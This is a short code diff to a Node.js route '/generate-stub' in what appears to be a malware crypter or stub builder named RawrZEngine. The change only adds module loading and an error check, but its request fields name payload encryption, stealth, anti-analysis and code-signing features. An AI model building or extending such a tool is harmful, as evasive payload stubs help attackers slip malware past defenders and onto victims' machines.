@@ -61,8 +61,14 @@ app.post('/generate-stub', async (req, res) => {
     try {
         const { target, stubType, encryptionMethod, stealthFeatures, antiAnalysisFeatures, evCertFeatures, hotpatchFeatures, payload, outputFormat, extension, customOptions } = req.body;
         
-        // Route to stub-generator engine
-        const module = RawrZEngine.modules.get('stub-generator');
+        // Route to stub-generator engine - use bridge approach
+        let module = RawrZEngine.modules.get('stub-generator');
+        if (!module) {
+            module = await RawrZEngine.loadModule('stub-generator');
+        }
+        if (!module) {
+            throw new Error('Stub Generator module not available');
+        }
         const result = await module.generateStub(target, {
             stubType,
             encryptionMethod,
